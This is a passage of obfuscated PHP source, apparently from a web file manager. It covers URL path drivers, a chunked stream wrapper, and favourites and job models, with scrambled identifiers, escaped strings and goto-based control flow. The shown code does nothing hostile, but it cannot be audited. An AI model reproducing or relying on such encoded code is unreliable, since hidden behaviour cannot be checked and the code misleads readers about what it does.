size($aÖäß……êÜ) { $eâ–«¡Ä‰§ = $this->objectMeta($aÖäß……êÜ); return $eâ–«¡Ä‰§ ? $eâ–«¡Ä‰§[$_SERVER[»„][77]] : 0; } public function info($ağ“ŸĞôµ¦) { if ($this->isFolder($ağ“ŸĞôµ¦)) { return $this->folderInfo($ağ“ŸĞôµ¦); } else { if ($this->isFile($ağ“ŸĞôµ¦)) { return $this->fileInfo($ağ“ŸĞôµ¦); } } return !1; } public function exist($bÖÄÑµ÷¯) { return $this->isFile($bÖÄÑµ÷¯) || $this->isFolder($bÖÄÑµ÷¯); } public function isFile($CÎ÷½–¡ˆ‰) { return !$this->isFolder($CÎ÷½–¡ˆ‰) && $this->objectMeta($CÎ÷½–¡ˆ‰); } public function isFolder($AêŠ±ïßÊË) { return $this->cacheMethod($_SERVER[»„][219], $AêŠ±ïßÊË); } protected function objectMeta($b´öÊÖç) { return $this->cacheMethod($_SERVER[»„][220], $b´öÊÖç); } protected function _objectMeta($B·Ÿ¬—ò¾×) { goto dÑ“‘åËù§; A‹Ûšé¦™Ö: if (!$båã¢¸öƒ[$B¹Çì‚ö¶ [1020]]) { return null; } $cö·çÕñĞ = isset($båã¢¸öƒ[$B¹Çì‚ö¶ [1022]]) ? $båã¢¸öƒ[$B¹Çì‚ö¶ [1022]] : array(); if (!isset($cö·çÕñĞ[$B¹Çì‚ö¶ [1264]])) { return null; } goto Dœ‡Ç¹¼Ç; Dœ‡Ç¹¼Ç: $D“´‡÷¿ÁÈ = array($B¹Çì‚ö¶ [28] => get_path_this($B·Ÿ¬—ò¾×), $B¹Çì‚ö¶ [29] => isset($cö·çÕñĞ[$B¹Çì‚ö¶ [1264]]) ? $cö·çÕñĞ[$B¹Çì‚ö¶ [1264]] : null, $B¹Çì‚ö¶ [77] => isset($cö·çÕñĞ[$B¹Çì‚ö¶ [1265]]) ? $cö·çÕñĞ[$B¹Çì‚ö¶ [1265]] : null, $B¹Çì‚ö¶ [192] => isset($cö·çÕñĞ[$B¹Çì‚ö¶ [1266]]) ? $cö·çÕñĞ[$B¹Çì‚ö¶ [1266]] : null, $B¹Çì‚ö¶ [1233] => isset($cö·çÕñĞ[$B¹Çì‚ö¶ [1267]]) ? $cö·çÕñĞ[$B¹Çì‚ö¶ [1267]] : null); $D“´‡÷¿ÁÈ[$B¹Çì‚ö¶ [1234]] = isset($cö·çÕñĞ[$B¹Çì‚ö¶ [1268]]) ? strtotime($cö·çÕñĞ[$B¹Çì‚ö¶ [1268]]) : $D“´‡÷¿ÁÈ[$B¹Çì‚ö¶ [1233]]; return $D“´‡÷¿ÁÈ; goto Cè•ç´Øî; dÑ“‘åËù§: $B¹Çì‚ö¶  =& $_SERVER[»„]; if ($B·Ÿ¬—ò¾× == $B¹Çì‚ö¶ [33] || $B·Ÿ¬—ò¾× == $B¹Çì‚ö¶ [8]) { return array(); } $båã¢¸öƒ = $this->ussRequest($B·Ÿ¬—ò¾×, $B¹Çì‚ö¶ [1263]); goto A‹Ûšé¦™Ö; Cè•ç´Øî: } protected function _isFolder($DôÁËŞÕ—) { $fÓ£Ç÷² =& $_SERVER[»„]; if ($DôÁËŞÕ— == $fÓ£Ç÷²[33] || $DôÁËŞÕ— == $fÓ£Ç÷²[8]) { return !0; } $D…ÒëÛŠÔĞ = $this->objectMeta($DôÁËŞÕ—); return isset($D…ÒëÛŠÔĞ[$fÓ£Ç÷²[29]]) && $D…ÒëÛŠÔĞ[$fÓ£Ç÷²[29]] == $fÓ£Ç÷²[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($A‘œ¡ÖØ©Ë = false) { } public function exist($f÷¯öÉš«À) { $DŒÇ†›‹ìà = $this->info($f÷¯öÉš«À); return $DŒÇ†›‹ìà[$_SERVER[»„][184]]; } public function isFile($eè¢ë±ğœŠ) { $f…›™ßÜç‰ = $this->info($eè¢ë±ğœŠ); return $f…›™ßÜç‰[$_SERVER[»„][184]]; } public function isFolder($F±ğŠ£ĞãÔ) { return !1; } public function size($aßÉµ¤áö) { $Fî¢º¶”¡ = $this->info($aßÉµ¤áö); return $Fî¢º¶”¡[$_SERVER[»„][77]]; } public function info($C‚ÇŠÅ¾ªë) { return $this->infoParse($C‚ÇŠÅ¾ªë); } public function infoAuth($fõæé°Á¡…) { return $this->infoParse($fõæé°Á¡…); } public function infoWithChildren($AÈŒøÀ¢óÓ) { return $this->infoParse($AÈŒøÀ¢óÓ); } public function infoFull($E·‘¾Ó„¥Œ) { return $this->infoParse($E·‘¾Ó„¥Œ); } private function infoParse($EÎ“¢Å¼ƒ†) { $FäëÕÒ‘˜Ë =& $_SERVER[»„]; $fŒƒ§ ‹®“ = $this->header($EÎ“¢Å¼ƒ†); if (!$fŒƒ§ ‹®“ || !$fŒƒ§ ‹®“[$FäëÕÒ‘˜Ë[677]]) { return !1; } $cîÏ‘Ûç¿ù = _get($fŒƒ§ ‹®“, $FäëÕÒ‘˜Ë[321], 0); $Eè¹ÑÉ–…ó = array($FäëÕÒ‘˜Ë[28] => $fŒƒ§ ‹®“[$FäëÕÒ‘˜Ë[28]], $FäëÕÒ‘˜Ë[75] => $EÎ“¢Å¼ƒ†, $FäëÕÒ‘˜Ë[29] => $FäëÕÒ‘˜Ë[163], $FäëÕÒ‘˜Ë[77] => intval($cîÏ‘Ûç¿ù), $FäëÕÒ‘˜Ë[156] => get_path_ext($fŒƒ§ ‹®“[$FäëÕÒ‘˜Ë[28]]), $FäëÕÒ‘˜Ë[1142] => $cîÏ‘Ûç¿ù > 0 && $fŒƒ§ ‹®“[$FäëÕÒ‘˜Ë[1269]], $FäëÕÒ‘˜Ë[1143] => !1); return $Eè¹ÑÉ–…ó; } private function header($D±Æ‡Íğã) { if (isset(self::$_cacheHeader[$D±Æ‡Íğã])) { return self::$_cacheHeader[$D±Æ‡Íğã]; } self::$_cacheHeader[$D±Æ‡Íğã] = url_header($D±Æ‡Íğã); return self::$_cacheHeader[$D±Æ‡Íğã]; } public function hashSimple($e¤Ø‘øÆºİ, $cä›îŒ“ÈŠ = false) { goto fÌÀ‰¶«Ÿò; fÏ¿À”õ é: $dè‰è½Ö×Š .= $this->fileSubstr($e¤Ø‘øÆºİ, $D§øÙ½‰ÈÏ - $BÅÆê¡‡, $BÅÆê¡‡); return md5($dè‰è½Ö×Š) . $D§øÙ½‰ÈÏ; goto e‹¾ª”»; B™Åëö„‡: $c¼¿‚Ã… = timeFloat(); $DçËŸ—õµ = 15; for ($fâòî£õ Ö = 0; $fâòî£õ Ö < $DóáÄ²„Œ‹; $fâòî£õ Ö++) { if (timeFloat() - $c¼¿‚Ã… > $DçËŸ—õµ) { return !1; } $D¼„èº†›Ÿ = $this->fileSubstr($e¤Ø‘øÆºİ, $F©Ÿ™×”Ñ¸ * $fâòî£õ Ö, $BÅÆê¡‡); if (!$D¼„èº†›Ÿ) { return !1; } $dè‰è½Ö×Š .= $D¼„èº†›Ÿ; } goto fÏ¿À”õ é; fÌÀ‰¶«Ÿò: $eÓ›‘ÄòÅ¹ =& $_SERVER[»„]; $c ÍÇœ‰Š¶ = $this->info($e¤Ø‘øÆºİ); if (!$c ÍÇœ‰Š¶ || !$c ÍÇœ‰Š¶[$eÓ›‘ÄòÅ¹[184]]) { return !1; } goto Dàè§Õƒ—”; dÑ¹ Š„‚: if ($D§øÙ½‰ÈÏ <= $BÅÆê¡‡ * $DóáÄ²„Œ‹) { return md5($this->fileSubstr($e¤Ø‘øÆºİ, 0, $D§øÙ½‰ÈÏ)) . $D§øÙ½‰ÈÏ; } $F©Ÿ™×”Ñ¸ = intval($D§øÙ½‰ÈÏ / $DóáÄ²„Œ‹); $dè‰è½Ö×Š = $eÓ›‘ÄòÅ¹[33]; goto B™Åëö„‡; Dàè§Õƒ—”: $D§øÙ½‰ÈÏ = $c ÍÇœ‰Š¶[$eÓ›‘ÄòÅ¹[77]]; $BÅÆê¡‡ = 200; $DóáÄ²„Œ‹ = 50; goto dÑ¹ Š„‚; e‹¾ª”»: } public function getContent($d¿¥š¾Â‡ò) { return $this->fileSubstr($d¿¥š¾Â‡ò); } public function fileSubstr($cÄ»ÏÃ£®­, $fê«¸§Öá— = 0, $d—£”¸á‰ = -1) { goto dñÈ„ŠµŸ; dö¥‚ç÷É¶: if ($d—£”¸á‰ === -1) { $d—£”¸á‰ = $aî„»„–âØ[$b¥ø¹µĞ„×[77]]; } if ($d—£”¸á‰ == 0) { return $b¥ø¹µĞ„×[33]; } $dÇ˜‚÷ŒÇ‘ = array($b¥ø¹µĞ„×[1270] . $fê«¸§Öá— . $b¥ø¹µĞ„×[702] . ($fê«¸§Öá— + $d—£”¸á‰ - 1)); goto e¹ØéÂ¾×; dñÈ„ŠµŸ: $b¥ø¹µĞ„× =& $_SERVER[»„]; $aî„»„–âØ = $this->info($cÄ»ÏÃ£®­); if (!$aî„»„–âØ || !$aî„»„–âØ[$b¥ø¹µĞ„×[184]] && $aî„»„–âØ[$b¥ø¹µĞ„×[77]] > 1024 * 1024 * 10) { return !1; } goto dö¥‚ç÷É¶; e¹ØéÂ¾×: $F½Õ¾‘Æë‡ = url_request($cÄ»ÏÃ£®­, $b¥ø¹µĞ„×[212], !1, $dÇ˜‚÷ŒÇ‘, !1, !1, 1); return $F½Õ¾‘Æë‡[$b¥ø¹µĞ„×[1022]] ? $F½Õ¾‘Æë‡[$b¥ø¹µĞ„×[1022]] : $b¥ø¹µĞ„×[33]; goto fï¢²‚‰Úæ; fï¢²‚‰Úæ: } public function download($a”ÌîŒ², $FøäÍ¯§Õ¯) { Downloader::start($a”ÌîŒ², $FøäÍ¯§Õ¯); return $FøäÍ¯§Õ¯; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($EœİÂ‰‡¼†, $fæŸöÀÎËº = '') { goto fá”Ò·ƒÏÍ; fá”Ò·ƒÏÍ: $this->info = $this->info($EœİÂ‰‡¼†); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[»„][75]]; goto bÏ¡æÒùÎ¸; bÏ¡æÒùÎ¸: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$EœİÂ‰‡¼†])) { self::$_chunkBuffer[$EœİÂ‰‡¼†] = array(); } goto C¨—”¥ÊéÉ; C¨—”¥ÊéÉ: return $this->info ? !0 : !1; goto f‚àğ¼Ğ; f‚àğ¼Ğ: } function stream_read($EÎ“²ßáÇ) { $b­Ê½‡¤à¨ = $this->fileSubstr($this->pose, $EÎ“²ßáÇ); $this->pose += strlen($b­Ê½‡¤à¨); return $b­Ê½‡¤à¨; } public function stream_tell() { return $this->pose; } public function stream_seek($cÕòÓøµÚ¼, $Eå±ƒŸ‰½ï) { $b÷Íò†ªİ =& $_SERVER[»„]; if ($Eå±ƒŸ‰½ï == SEEK_SET) { $this->pose = $cÕòÓøµÚ¼; } else { if ($Eå±ƒŸ‰½ï == SEEK_CUR) { $this->pose += $cÕòÓøµÚ¼; } else { if ($Eå±ƒŸ‰½ï == SEEK_END) { $this->pose = $this->info[$b÷Íò†ªİ[77]] + intval($cÕòÓøµÚ¼); } } } if ($cÕòÓøµÚ¼ < 0) { $this->pose = $this->info[$b÷Íò†ªİ[77]] + $cÕòÓøµÚ¼; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[»„][77]]; } public function stream_close() { return !0; } public function url_stat($fçêÑÛ©°ô, $BùÍÙƒ­‹) { $FºÏ–Í‚Õà =& $_SERVER[»„]; $A‡œ·ÇÕƒ‡ = $this->info($fçêÑÛ©°ô); return array($FºÏ–Í‚Õà[1271] => 0, $FºÏ–Í‚Õà[1272] => 0, $FºÏ–Í‚Õà[12] => 32768 + 511, $FºÏ–Í‚Õà[1273] => 0, $FºÏ–Í‚Õà[1274] => 0, $FºÏ–Í‚Õà[1275] => 0, $FºÏ–Í‚Õà[1276] => 0, $FºÏ–Í‚Õà[77] => $A‡œ·ÇÕƒ‡[$FºÏ–Í‚Õà[77]], $FºÏ–Í‚Õà[1277] => $A‡œ·ÇÕƒ‡[$FºÏ–Í‚Õà[1148]], $FºÏ–Í‚Õà[1234] => $A‡œ·ÇÕƒ‡[$FºÏ–Í‚Õà[106]], $FºÏ–Í‚Õà[1233] => $A‡œ·ÇÕƒ‡[$FºÏ–Í‚Õà[183]], $FºÏ–Í‚Õà[1278] => 0, $FºÏ–Í‚Õà[1279] => 0); } static $fileInfo = array(); public function info($AóÛË½îÔÚ) { $eÀùÔ„á = $_SERVER[»„][1280]; if (isset(self::$fileInfo[$AóÛË½îÔÚ])) { return self::$fileInfo[$AóÛË½îÔÚ]; } if (substr($AóÛË½îÔÚ, 0, strlen($eÀùÔ„á)) != $eÀùÔ„á) { return !1; } self::$fileInfo[$AóÛË½îÔÚ] = IO::info(substr($AóÛË½îÔÚ, strlen($eÀùÔ„á))); return self::$fileInfo[$AóÛË½îÔÚ]; } public static function read($A“Ï‹å¦»‡, $e˜Ê¼“á°Á, $d§…ª„„ê) { goto bß”¢‚ÑøÛ; b±Û¨¬©Ùñ: $eŞÁ¿î„§İ = 0; while ($eŞÁ¿î„§İ < $d§…ª„„ê) { $a„‰«®¹ª = min($fãÚ‚ãÌò¢, $d§…ª„„ê - $eŞÁ¿î„§İ); $béÔ´õ“± .= fread($CÊ¥ÕõÀ¶ì, $a„‰«®¹ª); $eŞÁ¿î„§İ += $a„‰«®¹ª; } fclose($CÊ¥ÕõÀ¶ì); goto bí›ÔŸ à; Fê‡‡‚îßø: $fãÚ‚ãÌò¢ = 8192; fseek($CÊ¥ÕõÀ¶ì, $e˜Ê¼“á°Á, SEEK_SET); $béÔ´õ“± = $D»»ò‰Ğƒ÷[33]; goto b±Û¨¬©Ùñ; bß”¢‚ÑøÛ: $D»»ò‰Ğƒ÷ =& $_SERVER[»„]; $CÊ¥ÕõÀ¶ì = fopen($A“Ï‹å¦»‡, $D»»ò‰Ğƒ÷[1150]); if (!$CÊ¥ÕõÀ¶ì) { return $D»»ò‰Ğƒ÷[33]; } goto Fê‡‡‚îßø; bí›ÔŸ à: return $béÔ´õ“±; goto e”Ü‘µ°•î; e”Ü‘µ°•î: } public function fileSubstr($FğÁ‚È–Á, $F¡¿­ğÑê) { goto Fëá ÉÜ¤¤; Fëá ÉÜ¤¤: $dÑ¬ßƒßˆ =& $_SERVER[»„]; $dµ¾ßİì = $this->info[$dÑ¬ßƒßˆ[77]]; $FœˆË÷”ğÃ = $FğÁ‚È–Á; goto aÔàÇ——¶†; b§Œí¯Í‚: foreach ($d‘åœ”Şš… as $eâôãò”” => $C¥ÖÛ¹®­) { $eâôãò”” = intval($eâôãò””); $aº³í¬×§Ä = $eâôãò”” + strlen($C¥ÖÛ¹®­); if ($FğÁ‚È–Á >= $aº³í¬×§Ä) { continue; } if ($FğÁ‚È–Á >= $eâôãò”” && $FğÁ‚È–Á + $F¡¿­ğÑê <= $aº³í¬×§Ä) { return substr($C¥ÖÛ¹®­, $FğÁ‚È–Á - $eâôãò””, $F¡¿­ğÑê); } break; } if (count($d‘åœ”Şš…) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($dÑ¬ßƒßˆ[1281], $dÑ¬ßƒßˆ[1282] . count($d‘åœ”Şš…) . "\73\x73\164\141\x72\164\x3d{$FğÁ‚È–Á}\54\x6c\145\x6e\x67\164\x68\x3d{$F¡¿­ğÑê}\x3b\160\157\x73\x65\72{$eâôãò””}\x7e{$aº³í¬×§Ä}"); throw new Exception($dÑ¬ßƒßˆ[1283]); } $cøô­šíÌå = intval($FğÁ‚È–Á / $EÜÈ°»Êæî) * $EÜÈ°»Êæî; goto DãÊ¼”ë·á; eÒé“‹‚‚À: if ($FğÁ‚È–Á + $F¡¿­ğÑê > $dµ¾ßİì) { $F¡¿­ğÑê = $dµ¾ßİì - $FğÁ‚È–Á; } if ($F¡¿­ğÑê <= 0) { return $dÑ¬ßƒßˆ[33]; } if ($FğÁ‚È–Á < 0 || $FğÁ‚È–Á >= $dµ¾ßİì || $F¡¿­ğÑê <= 0 || $F¡¿­ğÑê > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\151\x6c\145\x52\x65\141\144\x20\x65\x72\x72\x6f\x72\41\40\x73\164\x61\162\164\x3d{$FğÁ‚È–Á}\73\154\x65\156\x67\164\x68\x3d{$F¡¿­ğÑê}\x3b\x20\163\151\x7a\145\75{$dµ¾ßİì}\73"); } goto E˜‡©˜ìíë; AäÅùÏŒØ‚: ksort($d‘åœ”Şš…); $Eè´¬ç£¹ = substr($A„‰ª©¨¨“, $FğÁ‚È–Á - $cøô­šíÌå, $F¡¿­ğÑê); return $Eè´¬ç£¹; goto aŠ˜Ù‡—Æ; DãÊ¼”ë·á: $Cçãø‘÷°Ï = ceil(($FğÁ‚È–Á + $F¡¿­ğÑê) / $EÜÈ°»Êæî) * $EÜÈ°»Êæî - $cøô­šíÌå; $A„‰ª©¨¨“ = IO::fileSubstr($this->path, $cøô­šíÌå, $Cçãø‘÷°Ï); $d‘åœ”Şš…[$cøô­šíÌå . $dÑ¬ßƒßˆ[33]] = $A„‰ª©¨¨“; goto AäÅùÏŒØ‚; A³ö“Ä¿½¢: $eâôãò”” = 0; $aº³í¬×§Ä = 0; $C¥ÖÛ¹®­ = $dÑ¬ßƒßˆ[33]; goto b§Œí¯Í‚; aÔàÇ——¶†: $Bà®·‰åïƒ = $F¡¿­ğÑê; if ($FğÁ‚È–Á < 0) { $FğÁ‚È–Á = $dµ¾ßİì + $FğÁ‚È–Á; } if ($F¡¿­ğÑê === !1) { $F¡¿­ğÑê = $dµ¾ßİì - $FğÁ‚È–Á; } goto eÒé“‹‚‚À; E˜‡©˜ìíë: $EÜÈ°»Êæî = 64 * 1024; $d‘åœ”Şš… =& self::$_chunkBuffer[$this->path]; if (!$d‘åœ”Şš…) { $d‘åœ”Şš… = array(); } goto A³ö“Ä¿½¢; aŠ˜Ù‡—Æ: } private function log($a†ÊÄÒŠ†ˆ, $F¤Ò‡‘—ÅÎ) { $aÆçÖ§£® =& $_SERVER[»„]; $Eå¨¾ÁÉãß = timeFloat() - $this->timeStart; write_log(sprintf($aÆçÖ§£®[1284], $a†ÊÄÒŠ†ˆ, $this->info[$aÆçÖ§£®[28]], $Eå¨¾ÁÉãß, $F¤Ò‡‘—ÅÎ), $aÆçÖ§£®[1199]); } } goto b¶‘Ú¶Ä×¦; c® ””Ô…Œ: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($eÚØËÃ‘©Ì) { $f‘İ¼½ÀÃ„ =& $_SERVER[»„]; return array($f‘İ¼½ÀÃ„[2453] => array(USER_ID, $f‘İ¼½ÀÃ„[2454])); } protected function listData() { $DŠ§¢–‘á =& $_SERVER[»„]; $EéÖƒµİ¿ = array($DŠ§¢–‘á[1400] => USER_ID, $DŠ§¢–‘á[432] => 0); $b³ŸÉÀ‰ = $DŠ§¢–‘á[2455]; $bå™î¡ÀÃ† = $this->field($b³ŸÉÀ‰)->where($EéÖƒµİ¿)->order($DŠ§¢–‘á[2456])->select(); return $bå™î¡ÀÃ† ? $bå™î¡ÀÃ† : array(); } protected function resetCache() { } protected function listView() { goto b¹ø‘•Í”‘; AŒãÈÇÅé: $C¯„¶èŠ¨ = array_to_keyvalue($fÒèÒĞòÁ§, $Bø¾›Å¯¸ˆ[33], $Bø¾›Å¯¸ˆ[75]); if (!$C¯„¶èŠ¨) { return $D‡„ÎçÅœÒ; } $aÑô¸ÅõÆÉ = 2000; goto DµË’¼¡‘Ù; E“Ù¸Û¡â¤: $A™ñ¶øâ©´ = array_to_keyvalue($A™ñ¶øâ©´, $Bø¾›Å¯¸ˆ[365]); foreach ($D‡„ÎçÅœÒ as $f¤ƒå‡’Üš => $c•´î‹óš‘) { $BÄ‹ÚÍ‹ŠŸ = $A™ñ¶øâ©´[$c•´î‹óš‘[$Bø¾›Å¯¸ˆ[75]]]; $BÄ‹ÚÍ‹ŠŸ = $BÄ‹ÚÍ‹ŠŸ ? $BÄ‹ÚÍ‹ŠŸ : array(); $D‡„ÎçÅœÒ[$f¤ƒå‡’Üš] = array_merge($BÄ‹ÚÍ‹ŠŸ, $c•´î‹óš‘); } return $D‡„ÎçÅœÒ; goto F®‰ÜîÚ²ì; b¹ø‘•Í”‘: $Bø¾›Å¯¸ˆ =& $_SERVER[»„]; $D‡„ÎçÅœÒ = $this->listData(); $fÒèÒĞòÁ§ = array_filter_by_field($D‡„ÎçÅœÒ, $Bø¾›Å¯¸ˆ[29], $Bø¾›Å¯¸ˆ[378]); goto AŒãÈÇÅé; DµË’¼¡‘Ù: $dÑŞ³šÅ£» = array($Bø¾›Å¯¸ˆ[379] => array($Bø¾›Å¯¸ˆ[380], $C¯„¶èŠ¨)); $A™ñ¶øâ©´ = Model($Bø¾›Å¯¸ˆ[740])->listSource($dÑŞ³šÅ£», $aÑô¸ÅõÆÉ); $A™ñ¶øâ©´ = array_merge($A™ñ¶øâ©´[$Bø¾›Å¯¸ˆ[73]], $A™ñ¶øâ©´[$Bø¾›Å¯¸ˆ[74]]); goto E“Ù¸Û¡â¤; F®‰ÜîÚ²ì: } protected function addFav($E «¸Ï·Ÿ, $b¿—‹µàÒ = '', $cï÷æ‰Ñ÷ğ = "\x73\157\165\162\143\x65") { goto b‰ÃÒ²; EÓ¹ò˜±ô°: return $this->add($a°½‚–ğ»Õ); goto DÚÃóŞŠ„‚; b‰ÃÒ²: $eâ™íºìóõ =& $_SERVER[»„]; $b…±Ùê•á˜ = array($eâ™íºìóõ[1400] => USER_ID, $eâ™íºìóõ[432] => 0, $eâ™íºìóõ[384] => $cï÷æ‰Ñ÷ğ, $eâ™íºìóõ[383] => $E «¸Ï·Ÿ); if ($this->where($b…±Ùê•á˜)->find()) { return !1; } goto aë©ÏËÄÁò; aë©ÏËÄÁò: $b…±Ùê•á˜ = array($eâ™íºìóõ[1400] => USER_ID, $eâ™íºìóõ[432] => 0); $f¶”œµí = $this->where($b…±Ùê•á˜)->max($eâ™íºìóõ[2093]); if (!$f¶”œµí) { $f¶”œµí = 0; } goto e«’Ú©Üà; e«’Ú©Üà: if (!$b¿—‹µàÒ && $cï÷æ‰Ñ÷ğ == $eâ™íºìóõ[378]) { $C‚¡ˆñ’Ñ = Model($eâ™íºìóõ[1098])->where(array($eâ™íºìóõ[379] => $E «¸Ï·Ÿ))->find(); if (!$C‚¡ˆñ’Ñ) { return !1; } $b¿—‹µàÒ = $C‚¡ˆñ’Ñ[$eâ™íºìóõ[28]]; } $b¿—‹µàÒ = $this->getAutoName($b¿—‹µàÒ); $a°½‚–ğ»Õ = array($eâ™íºìóõ[1400] => USER_ID, $eâ™íºìóõ[432] => 0, $eâ™íºìóõ[382] => $b¿—‹µàÒ, $eâ™íºìóõ[383] => $E «¸Ï·Ÿ, $eâ™íºìóõ[384] => $cï÷æ‰Ñ÷ğ, $eâ™íºìóõ[2076] => $f¶”œµí + 1); goto EÓ¹ò˜±ô°; DÚÃóŞŠ„‚: } protected function remove($D²¾ˆ¨æ‡¤) { $A¦áÏ‚½» =& $_SERVER[»„]; $DÄŠ¡Œ¯’‰ = array($A¦áÏ‚½»[1400] => USER_ID, $A¦áÏ‚½»[381] => $D²¾ˆ¨æ‡¤); return $this->where($DÄŠ¡Œ¯’‰)->delete(); } protected function removeByName($D„÷©ùË­‘) { $aùîˆ ¯éµ =& $_SERVER[»„]; $aÄ‚Åê¥æÁ = array($aùîˆ ¯éµ[1400] => USER_ID, $aùîˆ ¯éµ[382] => $D„÷©ùË­‘, $aùîˆ ¯éµ[432] => 0); return $this->where($aÄ‚Åê¥æÁ)->delete(); } protected function rename($AŠŒ•É²ÒÆ, $cŒ¾­˜’…œ) { $bÎåÙÜÄ =& $_SERVER[»„]; if ($AŠŒ•É²ÒÆ == $cŒ¾­˜’…œ) { return !1; } $AéÅÔô¬Ø‡ = $this->getAutoName($cŒ¾­˜’…œ); if ($cŒ¾­˜’…œ != $AéÅÔô¬Ø‡) { return !1; } $då¥·âÀ· = array($bÎåÙÜÄ[1400] => USER_ID, $bÎåÙÜÄ[432] => 0, $bÎåÙÜÄ[28] => $AŠŒ•É²ÒÆ); return $this->where($då¥·âÀ·)->save(array($bÎåÙÜÄ[28] => $cŒ¾­˜’…œ)); } protected function resetSort($c¾Ù¹ÀŒĞÂ) { $AÛ‡”¢½Í§ =& $_SERVER[»„]; $c¾Ù¹ÀŒĞÂ = is_array($c¾Ù¹ÀŒĞÂ) ? $c¾Ù¹ÀŒĞÂ : array(); $fŞÎÆáİõÆ = array($AÛ‡”¢½Í§[1400] => USER_ID); for ($EÆÉÀ¼šè = 0; $EÆÉÀ¼šè < count($c¾Ù¹ÀŒĞÂ); $EÆÉÀ¼šè++) { $fŞÎÆáİõÆ[$AÛ‡”¢½Í§[381]] = $c¾Ù¹ÀŒĞÂ[$EÆÉÀ¼šè]; $this->where($fŞÎÆáİõÆ)->save(array($AÛ‡”¢½Í§[2076] => $EÆÉÀ¼šè + 1)); } return !0; } protected function moveTop($FÓŠÕÊ©äÎ) { goto d—œ„•¦Ò; d—œ„•¦Ò: $A¬ÚÁÔ›Ô =& $_SERVER[»„]; $a×øñš·Ğ‰ = array($A¬ÚÁÔ›Ô[1400] => USER_ID, $A¬ÚÁÔ›Ô[432] => 0); $BÏ‰ÔËù¯ = $this->where($a×øñš·Ğ‰)->where(array($A¬ÚÁÔ›Ô[28] => $FÓŠÕÊ©äÎ))->find(); goto FÈìÒ³ÂÆ®; fÂ¸Õ†ïƒ«: $D·Ú¼£Ÿ¶© = $CùÈóÁéôÃ; $CùÈóÁéôÃ = array_remove_value($CùÈóÁéôÃ, $BÏ‰ÔËù¯[$A¬ÚÁÔ›Ô[363]]); array_unshift($CùÈóÁéôÃ, $BÏ‰ÔËù¯[$A¬ÚÁÔ›Ô[363]]); goto CÕË¡ÁŒå; FÈìÒ³ÂÆ®: if (!$BÏ‰ÔËù¯) { return; } $CùÈóÁéôÃ = $this->field($A¬ÚÁÔ›Ô[363])->where($a×øñš·Ğ‰)->order($A¬ÚÁÔ›Ô[2456])->select(); $CùÈóÁéôÃ = array_to_keyvalue($CùÈóÁéôÃ, $A¬ÚÁÔ›Ô[33], $A¬ÚÁÔ›Ô[363]); goto fÂ¸Õ†ïƒ«; CÕË¡ÁŒå: return $this->resetSort($CùÈóÁéôÃ); goto CğÇ¯²„¢ˆ; CğÇ¯²„¢ˆ: } protected function moveBottom($E¶ë«İ‚´˜) { $eŠƒŞ„È²¥ =& $_SERVER[»„]; $F¬ˆŠß‹ = array($eŠƒŞ„È²¥[1400] => USER_ID, $eŠƒŞ„È²¥[432] => 0); $EĞ“Ñà´×‰ = $this->where($F¬ˆŠß‹)->max($eŠƒŞ„È²¥[2093]); $cïËéöòŞ = array($eŠƒŞ„È²¥[2093] => $EĞ“Ñà´×‰ + 1); return $this->where($F¬ˆŠß‹)->where(array($eŠƒŞ„È²¥[28] => $E¶ë«İ‚´˜))->save($cïËéöòŞ); } private function getAutoName($aÄ½‡… ­) { goto BéĞ¿ò®Û¿; Aó¿åˆºÒ: $bÈˆ’¤í•Ó = array_to_keyvalue($bÈˆ’¤í•Ó, $Eã¹Şâƒô[33], $Eã¹Şâƒô[28]); if (!$bÈˆ’¤í•Ó || !in_array($aÄ½‡… ­, $bÈˆ’¤í•Ó)) { return $aÄ½‡… ­; } for ($a¡À×½‡ùŒ = 0; $a¡À×½‡ùŒ < count($bÈˆ’¤í•Ó); $a¡À×½‡ùŒ++) { if (!in_array($aÄ½‡… ­ . "\x28{$a¡À×½‡ùŒ}\x29", $bÈˆ’¤í•Ó)) { return $aÄ½‡… ­ . "\x28{$a¡À×½‡ùŒ}\x29"; } } goto EãîÕ§ØÉ ; EãîÕ§ØÉ : return $aÄ½‡… ­ . "\50{$a¡À×½‡ùŒ}\x29"; goto Fâ²•áÙõ; BéĞ¿ò®Û¿: $Eã¹Şâƒô =& $_SERVER[»„]; $aí¿•¿À… = array($Eã¹Şâƒô[1400] => USER_ID, $Eã¹Şâƒô[432] => 0); $bÈˆ’¤í•Ó = $this->field($Eã¹Şâƒô[28])->where($aí¿•¿À…)->select(); goto Aó¿åˆºÒ; Fâ²•áÙõ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\152\x6f\x62\114\x69\163\164"; public $field = array("\156\x61\155\x65", "\x64\x65\163\x63", "\163\157\162\x74"); const JOB_KEY = "\163\x65\x6c\146\112\157\142\114\151\163\x74"; public function listData($a†×°÷ç Œ = false, $F½«ÑÀ±ÆÏ = "\x73\x6f\x72\164", $B¡‹õË¦ó´ = false) { return parent::listData($a†×°÷ç Œ, $F½«ÑÀ±ÆÏ, $B¡‹õË¦ó´); } public function remove($C‡Ã‹•ŒÑ) { return parent::remove($C‡Ã‹•ŒÑ); } public function add($CîëÇäù–ù) { $eÊ¨¡Ä =& $_SERVER[»„]; if ($this->findByName($CîëÇäù–ù[$eÊ¨¡Ä[28]])) { return !1; } $CîëÇäù–ù[$eÊ¨¡Ä[2093]] = $this->getSort(); return parent::insert($CîëÇäù–ù); } private function getSort() { $DÅŞØ¡øÁ‰ =& $_SERVER[»„]; $bø÷êäÀ¦® = parent::listData(); $BîÎä¿¡…™ = array_to_keyvalue($bø÷êäÀ¦®, $DÅŞØ¡øÁ‰[33], $DÅŞØ¡øÁ‰[2093]); return empty($BîÎä¿¡…™) ? 0 : max($BîÎä¿¡…™) + 1; } public function update($AğŞ³Äæ‚¿, $dİ½˜¨Ç´ó) { $aÏÚî«ŒÔù =& 